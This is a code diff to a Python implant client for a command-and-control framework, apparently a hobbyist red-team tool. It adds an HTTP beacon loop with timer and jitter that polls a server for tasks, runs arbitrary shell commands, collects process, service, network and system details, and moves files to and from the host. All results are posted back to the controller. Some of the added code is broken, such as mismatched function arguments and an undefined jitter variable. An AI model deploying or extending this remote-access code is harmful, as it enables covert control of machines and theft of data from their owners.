@@ -15,18 +15,24 @@ import hashlib
 import struct
 import platform
 import re
-import uuid
 import shutil
 import stat
 import pwd
 import grp
 import threading
+import json
+import random
+import http.client
+import urllib.parse
+import uuid
+from typing import Tuple
 from getpass import getuser
 from time import sleep
 from datetime import datetime
 
 
-address = "127.0.0.1", 1100
+address = "127.0.0.1", 8080
+sessionaddress = "127.0.0.1", 2000
 
 
 class Client:
@@ -48,7 +54,7 @@ class Client:
         """
         while True:
             try:
-                ssl_sock.connect(address)
+                ssl_sock.connect(sessionaddress)
                 received_data = self.receive_data(ssl_sock)
                 port = (ssl_sock.getsockname()[1])
                 self.authentication((received_data + str(port))[::-1])
@@ -91,14 +97,34 @@ class Client:
         or execute the command to call functions
         """
         while True:
-            deco_data = self.receive_data(ssl_sock)
-            if deco_data == "shutdown":
+            data = self.receive_data(ssl_sock)
+            if data == "shutdown":
                 ssl_sock.close()
                 sys.exit(1)
-            if deco_data != "":
-                data = (f'self.{deco_data}()')
+            if data == "switch_beacon":
+                ssl_sock.close()
+                break
             try:
-                exec(data)
+                if data == "shell":
+                    self.shell()
+                elif data == "list_processes":
+                    self.list_processes("session", None, None)
+                elif data == "systeminfo":
+                    self.systeminfo("session", None, None)
+                elif data == "checkfiles":
+                    self.checkfiles()
+                elif data == "send_file":
+                    self.send_file("session", None, None, None)
+                elif data == "recv_file":
+                    self.recv_file("session", None, None, None, None)
+                elif data == "list_services":
+                    self.list_services("session", None, None)
+                elif data == "disk_usage":
+                    self.disk_usage("session", None, None)
+                elif data == "netstat":
+                    self.netstat("session", None, None)
+                elif data == "list_dir":
+                    self.list_dir("session", None, None, None)
             except SyntaxError:
                 break
         return
@@ -137,6 +163,29 @@ class Client:
             return
         except BaseException:
             return
+
+    def get_request(self, url: str) -> Tuple[int, str]:
+        parsed_url = urllib.parse.urlparse(url)
+        conn = http.client.HTTPConnection(parsed_url.netloc)
+        conn.request("GET", parsed_url.path +
+                     ("?" + parsed_url.query if parsed_url.query else ""))
+        response = conn.getresponse()
+        data = response.read().decode()
+        conn.close()
+        return response.status, data
+
+    def post_request(self, url: str, body: dict) -> Tuple[int, str]:
+        parsed_url = urllib.parse.urlparse(url)
+        headers = {"Content-type": "application/json"}
+        conn = http.client.HTTPConnection(parsed_url.netloc)
+        json_data = json.dumps(body)
+        # Include query parameters in the request
+        path_with_params = parsed_url.path + "?" + parsed_url.query
+        conn.request("POST", path_with_params, body=json_data, headers=headers)
+        response = conn.getresponse()
+        data = response.read().decode()
+        conn.close()
+        return response.status, data
 
     def send_data(self, sendsocket, data):
         """
@@ -237,7 +286,7 @@ class Client:
         except FileNotFoundError:
             return 0.0
 
-    def list_processes(self):
+    def list_processes(self, mode, user_id, cid):
         """lists all processes on the system"""
         allprocesses = ""
         # loops through entries in /proc
@@ -269,14 +318,19 @@ class Client:
                     allprocesses += ' '.join(entry)
                 except FileNotFoundError:
                     pass
-        self.send_data(ssl_sock, allprocesses)
+        if mode == "beacon" and user_id and cid:
+            self.post_request(
+                (f"http://{address[0]}:{address[1]}/response?"
+                 f"id={user_id}&cid={cid}"),
+                {"output": allprocesses})
+        elif mode == "session":
+            self.send_data(ssl_sock, allprocesses)
         return
 
-    def systeminfo(self):
+    def systeminfo(self, mode, user_id, cid):
         """gets system info of the command
         sends a crafted string of useful information about the system"""
-
-        self.send_data(ssl_sock, str(f"""SYSTEM INFO:\n
+        data = str(f"""SYSTEM INFO:\n
 System = {platform.system()}
 platform-release = {platform.release()}
 platform-version = {platform.version()}
@@ -284,7 +338,12 @@ architecture = {platform.machine()}
 hostname = {socket.gethostname()}
 ip-address = {socket.gethostbyname(socket.gethostname())}
 mac-address = {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
-processor = {platform.processor()}"""))
+processor = {platform.processor()}""")
+        if mode == "beacon" and user_id and cid:
+            self.post_request((f"http://{address[0]}:{address[1]}/response?"
+                               f"id={user_id}&cid={cid}"), {"output": data})
+        elif mode == "session":
+            self.send_data(ssl_sock, data)
         return
 
     def checkfiles(self):
@@ -342,9 +401,11 @@ processor = {platform.processor()}"""))
                 data).hexdigest())
             return
 
-    def send_file(self):
+    def send_file(self, mode, filename, user_id, cid):
         """ send a file from the client to the server"""
-        filename = self.receive_data(ssl_sock)  # grabs the requested file name
+        error = False
+        if not filename:
+            filename = self.receive_data(ssl_sock)
         try:
             with open(filename, "rb") as f:  # trys to open the file as bytes
                 self.send_data(
@@ -352,36 +413,64 @@ processor = {platform.processor()}"""))
                         os.path.getsize(filename)))
                 f.close()
         except FileNotFoundError:
-            self.send_data(ssl_sock, "Error")
-            self.send_data(ssl_sock, "File doesn't exist")
+            error = True
+            error_message = f"Error: {filename} does not exist"
         except PermissionError:
-            self.send_data(ssl_sock, "Error")
-            self.send_data(
-                ssl_sock,
-                "You do not have permission to access this file")
+            error = True
+            error_message = (
+                f"Error: You do not have permission to access {filename}"
+            )
         except IsADirectoryError:
-            self.send_data(ssl_sock, "Error")
-            self.send_data(ssl_sock, "This is a directory")
+            error = True
+            error_message = f"Error: {filename} is a directory"
+        if mode == "beacon" and user_id and cid:
+            if error:
+                self.post_request(
+                    (f"http://{address[0]}:{address[1]}/response?"
+                     f"id={user_id}&cid={cid}"),
+                    {"output": error_message}
+                )
+            else:
+                self.post_request(
+                    (f"http://{address[0]}:{address[1]}/response?"
+                     f"id={user_id}&cid={cid}"),
+                    {"output": f"File {filename} sent"}
+                )
+        else:
+            if error:
+                self.send_data(ssl_sock, "Error")
+                self.send_data(ssl_sock, error_message)
+            else:
+                self.send_data(ssl_sock, f"File {filename} sent")
 
-    def recv_file(self):
+    def recv_file(self, mode, filename, data, user_id, cid):
         """ recieve a file from the server to the client"""
+
         filename = self.receive_data(ssl_sock)
         if filename == "break":
             return
-        data = self.receive_data(ssl_sock)
+        if mode == "session" and not data:
+            data = self.receive_data(ssl_sock)
         if isinstance(data, str):
             data = data.encode()
         with open(filename, "wb") as f:
             f.write(data)
             f.close()
-        self.send_data(ssl_sock, str(self.check_file_exists(filename)))
+        if mode == "beacon" and user_id and cid:
+            self.post_request(
+                (f"http://{address[0]}:{address[1]}/response?"
+                 f"id={user_id}&cid={cid}"),
+                {"output": f"File {filename} recieved"}
+            )
+        else:
+            self.send_data(ssl_sock, str(self.check_file_exists(filename)))
         return
 
     def check_file_exists(self, file):
         """check a file eixsts on the machine"""
         return os.path.isfile(file)
 
-    def list_services(self):
+    def list_services(self, mode, user_id, cid):
         """list services and grab the status of the service"""
         OS = platform.system()  # gets the OS
         if OS == "Linux":
@@ -441,17 +530,31 @@ processor = {platform.processor()}"""))
                                 service_file) else "Stopped"  # grab the status
                         # appends the service name and status to the bottom
                         services += f"Name: {file} Status: {status}\n"
-        self.send_data(ssl_sock, services)  # send the data across
+        if mode == "beacon" and user_id and cid:
+            self.post_request(
+                (f"http://{address[0]}:{address[1]}/response?"
+                 f"id={user_id}&cid={cid}"),
+                {"output": services}
+            )
+        elif mode == "session":
+            self.send_data(ssl_sock, services)
 
-    def disk_usage(self):
+    def disk_usage(self, mode, user_id, cid):
         """grabs the disk usuage for the OS disk in gb"""
         usage = shutil.disk_usage("/")
-        self.send_data(
-            ssl_sock,
+        data = (
             f"Disk usage for /: \n Total: {usage.total / (1024**3):.3f} GB\n"
             f" Used: {usage.used / (1024**3):.3f} GB\n"
             f" Free: {usage.free / (1024**3):.3f} GB\n"
         )
+        if mode == "beacon" and user_id and cid:
+            self.post_request(
+                (f"http://{address[0]}:{address[1]}/response?"
+                 f"id={user_id}&cid={cid}"),
+                {"output": data}
+            )
+        elif mode == "session":
+            self.send_data(ssl_sock, data)
         return
 
     def ip_to_str(self, ip):
@@ -473,25 +576,33 @@ processor = {platform.processor()}"""))
                 f"RemoteIP: {remote_ip_str} RemotePort: {remote_port_int}, "
                 f"State: {state}")
 
-    def netstat(self):
+    def netstat(self, mode, user_id, cid):
         """reads netsat files and formats them to make them readable"""
         with open('/proc/net/tcp', 'r') as f:  # load file
             lines = f.readlines()
-
+        data = ""
         for line in lines[1:]:
-            # parses the data to make it in a readable format then sends it
-            # line by line
-            self.send_data(ssl_sock, f"{str(self.parse_tcp_line(line))}\n")
+            data += f"{str(self.parse_tcp_line(line))}\n"
+            if mode == "session":
+                self.send_data(ssl_sock, f"{str(self.parse_tcp_line(line))}\n")
         # sends the break to signify last line
-        self.send_data(ssl_sock, "break")
+        if mode == "session":
+            self.send_data(ssl_sock, "break")
+        else:
+            self.post_request(
+                (f"http://{address[0]}:{address[1]}/response?"
+                 f"id={user_id}&cid={cid}"),
+                {"output": data}
+            )
 
-    def list_dir(self):
+    def list_dir(self, mode, directory_path, user_id, cid):
         """
         list directorys without using on system
         binaries in the style of ls -al
         """
         message = ""
-        directory_path = self.receive_data(ssl_sock)  # recieves the path
+        if not directory_path and mode == "session":
+            directory_path = self.receive_data(ssl_sock)  # recieves the path
         try:
             # loads the contents of the directory
             contents = os.listdir(directory_path)
@@ -521,18 +632,154 @@ processor = {platform.processor()}"""))
             message = "Error: You do not have permissions to view this folder"
         except (NotADirectoryError, FileNotFoundError):
             message = "Error: This is not a directory"
-        self.send_data(ssl_sock, message)  # send message over socket
+        if mode == "beacon" and user_id and cid:
+            self.post_request(
+                (f"http://{address[0]}:{address[1]}/response?"
+                 f"id={user_id}&cid={cid}"),
+                {"output": message}
+            )
+        else:
+            self.send_data(ssl_sock, message)
+
+    def beacon_list_processes(self, user_id, cid):
+        """lists all processes on the system"""
+        allprocesses = ""
+        # loops through entries in /proc
+        for pid in os.listdir('/proc'):
+            # checks if the file is a PID
+            if pid.isdigit():
+                try:
+                    # status file contains details on the process
+                    with open(f'/proc/{pid}/status') as status_file:
+                        status_lines = status_file.readlines()
+
+                    process_info = {}
+                    # loops each line in status lines
+                    for line in status_lines:
+                        # splits each into key value using
+                        parts = line.split(':')
+                        # strips anywhitespace and stores in a dictionary
+                        if len(parts) == 2:
+                            key, value = parts[0].strip(), parts[1].strip()
+                            process_info[key] = value
+                    process_name = process_info.get(
+                        'Name', 'N/A')  # retrieves the process name or n/a
+                    cpu_usage = self.calculate_cpu_usage(
+                        pid)  # calculates cpu usage
+
+                    entry = (
+                        f"PID:{pid} Name:{process_name} CPU Usage:",
+                        f"{cpu_usage:.2f}\n")
+                    allprocesses += ' '.join(entry)
+                except FileNotFoundError:
+                    pass
+        self.post_request(
+            (f"http://{address[0]}:{address[1]}/response?"
+             f"id={user_id}&cid={cid}"),
+            {"output": allprocesses}
+        )
+        return
+
+    def httpConnection(self) -> Tuple[int, str, int]:
+        """beacon to the server"""
+        r = self.get_request(
+            f"http://{address[0]}:{address[1]}/connection?"
+            f"name={socket.gethostname()}&os={platform.system()}&"
+            f"address={socket.gethostbyname(socket.gethostname())}"
+        )
+        if r[0] == 200:
+            data = json.loads(r[1])
+            return data['timer'], data['uuid'], data['jitter']
+        else:
+            raise Exception(f"Failed to connect to server: {r[0]} {r[1]}")
+
+    def reconect(self, user_id, jitter, timer):
+        """beacon to the server"""
+        r = self.get_request(
+            f"http://{address[0]}:{address[1]}/reconect?name="
+            f"{socket.gethostname()}"
+            f"&os={platform.system()}&address="
+            f"{socket.gethostbyname(socket.gethostname())}"
+            f"&id={user_id}&timer={timer}&jitter={jitter}"
+        )
+        if r[0] == 200:
+            pass
+        else:
+            raise Exception(f"Failed to connect to server: {r[0]} {r[1]}")
+
+    def beacon(self, timer, user_id):
+        """beacon to the server"""
+        while True:
+            url = f"http://{address[0]}:{address[1]}/beacon?id={user_id}"
+            r = self.get_request(url)
+            data = {}
+            try:
+                data = json.loads(r[1])
+            except json.JSONDecodeError:
+                pass
+            if "command" in data:
+                command = data["command"]
+                cid = data["command_uuid"]
+                # need to change to a switch statement
+                if command == "shell":
+                    self.post_request(
+                        (f"http://{address[0]}:{address[1]}/response?"
+                         f"id={user_id}&cid={cid}"),
+                        {
+                            "output": (
+                                f"{subprocess.getoutput(data['shellcommand'])}"
+                            )
+                        }
+                    )
+                elif command == "list_processes":
+                    self.list_processes("beacon", user_id, cid)
+                elif command == "systeminfo":
+                    self.systeminfo("beacon", user_id, cid)
+                elif command == "checkfiles":
+                    self.checkfiles("beacon", user_id, cid)
+                elif command == "send_file":
+                    self.send_file("beacon", data['filename'], user_id, cid)
+                elif command == "recv_file":
+                    self.recv_file("beacon", data['filename'],
+                                   data['filedata'], user_id, cid)
+                elif command == "list_services":
+                    self.list_services("beacon", user_id, cid)
+                elif command == "disk_usage":
+                    self.disk_usage("beacon", user_id, cid)
+                elif command == "netstat":
+                    self.netstat("beacon", user_id, cid)
+                elif command == "list_dir":
+                    self.list_dir("beacon", command, user_id, cid)
+                if command == "session":
+                    break
+            if "timer" in data:
+                timer = data["timer"]
+            try:
+                sleep(int(timer + random.randint(-jitter, jitter)))
+            except ValueError:
+                sleep(timer)
 
 
 if __name__ == '__main__':
+    timer = 20
+    ID = None
+    jitter = None
     try:
         client = Client()  # calls the client class
         while True:
-            client.socketinitilsation()  # starts socket
-            client.connection()
-            client.sendhostname()  # sends hostname
-            client.send_data(ssl_sock, "Python")
-            client.check_listener()  # checks listner
-            client.serverhandler()  # starts server handler
+            try:
+                if ID and jitter:
+                    client.reconect(ID, jitter, timer)
+                else:
+                    timer, ID, jitter = client.httpConnection()
+                client.beacon(timer, ID)
+                client.socketinitilsation()
+                client.connection()
+                client.sendhostname()
+                client.send_data(ssl_sock, f"Python, {ID}")
+                client.check_listener()
+                client.serverhandler()
+            except BaseException:
+                sleep(10)
     except KeyboardInterrupt:
         print("exit")
